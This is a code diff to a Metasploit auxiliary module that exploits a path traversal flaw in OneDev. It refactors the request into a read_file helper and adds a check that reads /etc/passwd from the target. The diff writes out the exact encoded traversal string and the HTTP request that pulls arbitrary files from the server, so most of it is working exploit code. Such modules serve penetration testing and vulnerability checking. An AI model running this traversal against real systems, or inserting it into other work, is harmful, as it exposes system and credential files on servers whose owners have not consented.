@@ -5,6 +5,7 @@
 
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
+  prepend Msf::Exploit::Remote::AutoCheck
   CheckCode = Exploit::CheckCode
 
   def initialize(info = {})
@@ -65,6 +66,15 @@ class MetasploitModule < Msf::Auxiliary
     version = res.body.scan(/OneDev ([\d.]+)/).first
 
     if version.nil?
+      if datastore['PROJECT_NAME']
+        res = read_file(datastore['PROJECT_NAME'], '/etc/passwd')
+        
+        if res.body.include? 'root:x:0:0:root:'
+          return CheckCode::Appears("OneDev instance is vulnerable.")
+        else
+          return CheckCode::Safe("OneDev instance is not vulnerable.")
+        end
+      end
       return CheckCode::Unknown("Unable to detect the OneDev version, as the instance does not have anonymous access enabled.")
     end
 
@@ -97,6 +107,18 @@ class MetasploitModule < Msf::Auxiliary
     nil
   end
 
+  def read_file(project_name, target_file)
+    path_traversal = '~site////////%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e'
+    payload_path = normalize_uri(target_uri.path, project_name)
+    payload_path = "#{payload_path}/#{path_traversal}#{target_file}"
+
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri' => payload_path
+    })
+    return res
+  end
+
   def run
     project_name = datastore['PROJECT_NAME']
 
@@ -107,14 +129,7 @@ class MetasploitModule < Msf::Auxiliary
       fail_with(Failure::NoTarget, 'Provided project name is invalid.') unless validate_project_exists(project_name)      
     end
 
-    path_traversal = '~site////////%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e'
-    payload_path = normalize_uri(target_uri.path, project_name)
-    payload_path = "#{payload_path}/#{path_traversal}#{datastore['TARGETFILE']}"
-
-    res = send_request_cgi({
-      'method' => 'GET',
-      'uri' => payload_path
-    })
+    res = read_file(project_name, datastore['TARGETFILE'])
 
     fail_with(Failure::Unreachable, 'Request timed out.') unless res
 
